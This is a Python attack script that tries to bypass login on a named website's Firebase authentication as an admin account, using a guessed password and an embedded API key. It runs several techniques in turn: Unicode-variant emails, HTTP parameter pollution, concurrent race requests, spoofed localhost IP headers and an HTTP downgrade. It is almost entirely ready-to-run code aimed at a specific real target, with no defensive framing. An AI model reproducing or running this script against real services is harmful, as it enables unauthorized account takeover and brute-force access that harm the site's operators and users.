import requests
import json
import time
import random
import string

# Extremely advanced and uncommon bypass techniques
def test_extreme_bypass():
    print("=== EXTREME AND UNCOMMON AUTHENTICATION BYPASS TECHNIQUES ===")
    
    auth_url = "https://uplinkai.in/auth"
    api_key = "AIzaSyA0grBMnQ2VnDKD-Q8QFkA7cirthBYcmFY"
    firebase_api_base = "https://identitytoolkit.googleapis.com/v1"
    
    print("1. Testing Unicode normalization attacks...")
    
    # Test with Unicode variants
    unicode_emails = [
        "admin@uplinkai.in",  # Normal
        "admin\u200C@uplinkai.in",  # Zero-width non-joiner
        "admin\u200B@uplinkai.in",  # Zero-width space
        "admin\uFEFF@uplinkai.in",  # Zero-width no-break space
        "admin\u0041@uplinkai.in",  # Latin capital A
    ]
    
    for email in unicode_emails:
        try:
            signin_url = f"{firebase_api_base}/accounts:signInWithPassword?key={api_key}"
            response = requests.post(signin_url, 
                                   json={"email": email, "password": "admin123"}, 
                                   timeout=10)
            print(f"Unicode email {email.encode('unicode_escape')}: {response.status_code}")
        except Exception as e:
            print(f"Unicode test error: {e}")
    
    print("\n2. Testing HTTP parameter pollution (HPP)...")
    
    # Test with multiple parameters in URL
    signin_url = f"{firebase_api_base}/accounts:signInWithPassword?key={api_key}"
    
    # Try sending parameters in different ways
    hpp_tests = [
        {"email": "admin@uplinkai.in", "password": "admin123", "key": "fake_key"},
        {"email": "admin@uplinkai.in&password=admin123", "password": "admin123"},
        {"email": "admin@uplinkai.in", "password": "admin123&email=admin@gmail.com"},
    ]
    
    for test in hpp_tests:
        try:
            # Test with different content types
            headers = {"Content-Type": "application/x-www-form-urlencoded"}
            response = requests.post(signin_url, data=test, headers=headers, timeout=10)
            print(f"HPP test: {response.status_code}")
            
            # Test with JSON
            headers = {"Content-Type": "application/json"}
            response = requests.post(signin_url, json=test, headers=headers, timeout=10)
            print(f"HPP JSON test: {response.status_code}")
        except Exception as e:
            print(f"HPP error: {e}")
    
    print("\n3. Testing race condition attacks...")
    
    # Try rapid concurrent requests
    def rapid_request(email, password):
        try:
            signin_url = f"{firebase_api_base}/accounts:signInWithPassword?key={api_key}"
            response = requests.post(signin_url, 
                                   json={"email": email, "password": password}, 
                                   timeout=5)
            return response.status_code
        except:
            return None
    
    # Test with multiple threads
    import threading
    
    threads = []
    results = []
    
    def worker():
        result = rapid_request("admin@uplinkai.in", "admin123")
        results.append(result)
    
    print("Starting race condition test...")
    for i in range(10):
        t = threading.Thread(target=worker)
        threads.append(t)
        t.start()
    
    for t in threads:
        t.join()
    
    print(f"Race condition results: {set(results)}")
    
    print("\n4. Testing Cloudflare/Firebase edge case attacks...")
    
    # Test with unusual headers that might bypass edge security
    edge_headers = [
        {"CF-Connecting-IP": "127.0.0.1"},
        {"X-Forwarded-For": "127.0.0.1"},
        {"X-Real-IP": "127.0.0.1"},
        {"X-Originating-IP": "127.0.0.1"},
        {"X-Remote-IP": "127.0.0.1"},
        {"X-Client-IP": "127.0.0.1"},
    ]
    
    for headers in edge_headers:
        try:
            signin_url = f"{firebase_api_base}/accounts:signInWithPassword?key={api_key}"
            response = requests.post(signin_url, 
                                   json={"email": "admin@uplinkai.in", "password": "admin123"}, 
                                   headers=headers, timeout=10)
            print(f"Edge header {list(headers.keys())[0]}: {response.status_code}")
        except Exception as e:
            print(f"Edge test error: {e}")
    
    print("\n5. Testing protocol downgrade attacks...")
    
    # Test with different protocols
    protocols = [
        "http://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=",
        "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=",
    ]
    
    for protocol in protocols:
        try:
            signin_url = f"{protocol}{api_key}"
            response = requests.post(signin_url, 
                                   json={"email": "admin@uplinkai.in", "password": "admin123"}, 
                                   timeout=10)
            print(f"Protocol {protocol.split(':')[0]}: {response.status_code}")
        except Exception as e:
            print(f"Protocol test error: {e}")

if __name__ == "__main__":
    test_extreme_bypass()
